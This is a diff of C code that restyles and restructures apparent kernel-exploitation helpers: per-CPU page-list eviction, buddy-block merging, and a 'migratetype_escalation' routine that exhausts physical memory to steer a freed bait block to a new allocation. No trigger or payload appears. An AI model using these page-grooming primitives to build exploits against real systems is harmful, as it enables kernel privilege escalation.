@@ -18,76 +18,72 @@
 #define PCP_PUSH_SIZE 0x2000000UL
 
 int pcp_evict() {
-  const char *buf = "ffffffffffffffff";
-  int fds[NUM_FLUSH_FILES];
+    const char* buf = "ffffffffffffffff";
+    int fds[NUM_FLUSH_FILES];
 
-  void *flush_ptr = mmap(NULL, PCP_FLUSH_SIZE, PROT_READ | PROT_WRITE,
-                         MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);
-  if (flush_ptr == MAP_FAILED) {
-    return -1;
-  }
-
-  for (int i = 0; i < NUM_FLUSH_FILES; ++i) {
-    fds[i] = open("/tmp", O_TMPFILE | O_RDWR, S_IRUSR | S_IWUSR);
-    if (fds[i] == -1) {
-      return -1;
+    void* flush_ptr = mmap(NULL, PCP_FLUSH_SIZE, PROT_READ | PROT_WRITE,
+                           MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);
+    if(flush_ptr == MAP_FAILED) {
+        return -1;
     }
-    write(fds[i], buf, 8);
-  }
 
-  munmap(flush_ptr, PCP_FLUSH_SIZE);
-
-  for (int i = 0; i < NUM_FLUSH_FILES; ++i) {
-    if (close(fds[i]) == -1) {
-      return -1;
+    for(int i = 0; i < NUM_FLUSH_FILES; ++i) {
+        fds[i] = open("/tmp", O_TMPFILE | O_RDWR, S_IRUSR | S_IWUSR);
+        if(fds[i] == -1) {
+            return -1;
+        }
+        write(fds[i], buf, 8);
     }
-  }
 
-  return 0;
-}
+    munmap(flush_ptr, PCP_FLUSH_SIZE);
 
-int block_merge(void *target, unsigned order) {
-  if (munmap(target, PAGE_SIZE << order)) {
-    return -1;
-  }
+    for(int i = 0; i < NUM_FLUSH_FILES; ++i) {
+        if(close(fds[i]) == -1) {
+            return -1;
+        }
+    }
 
-  if (order == 0) {
     return 0;
-  }
-
-  void *flush_ptr = mmap(NULL, PCP_PUSH_SIZE, PROT_READ | PROT_WRITE,
-                         MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);
-  if (flush_ptr == MAP_FAILED) {
-    return -1;
-  }
-
-  return munmap(flush_ptr, PCP_PUSH_SIZE);
 }
 
-void *exhaust_blocks(unsigned long *exhaust_size) {
-  *exhaust_size =
-      sysconf(_SC_AVPHYS_PAGES) * sysconf(_SC_PAGESIZE) - 0x10000000UL;
+int block_merge(void* target, unsigned order) {
+    if(munmap(target, PAGE_SIZE << order)) {
+        return -1;
+    }
 
-  return mmap(NULL, *exhaust_size, PROT_READ | PROT_WRITE,
-              MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
+    if(order == 0) {
+        return 0;
+    }
+
+    void* flush_ptr = mmap(NULL, PCP_PUSH_SIZE, PROT_READ | PROT_WRITE,
+                           MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);
+    if(flush_ptr == MAP_FAILED) {
+        return -1;
+    }
+
+    return munmap(flush_ptr, PCP_PUSH_SIZE);
 }
 
-int migratetype_escalation(void *bait, unsigned bait_order,
+int migratetype_escalation(void* bait,
+                           unsigned bait_order,
                            int (*bait_allocator)()) {
-  unsigned long exhaust_size;
+    unsigned long exhaust_size = sysconf(_SC_AVPHYS_PAGES) *
+        sysconf(_SC_PAGESIZE) - 0x10000000UL;
 
-  void *exhaust_ptr = exhaust_blocks(&exhaust_size);
-  if (exhaust_ptr == MAP_FAILED) {
-    return -1;
-  }
+    auto exhaust_ptr = mmap(NULL, exhaust_size, PROT_READ | PROT_WRITE,
+                            MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
 
-  if (block_merge(bait, bait_order)) {
-    return -1;
-  }
+    if(exhaust_ptr == MAP_FAILED) {
+        return -1;
+    }
 
-  if (bait_allocator()) {
-    return -1;
-  }
+    if(block_merge(bait, bait_order)) {
+        return -1;
+    }
 
-  return munmap(exhaust_ptr, exhaust_size);
+    if(bait_allocator()) {
+        return -1;
+    }
+
+    return munmap(exhaust_ptr, exhaust_size);
 }
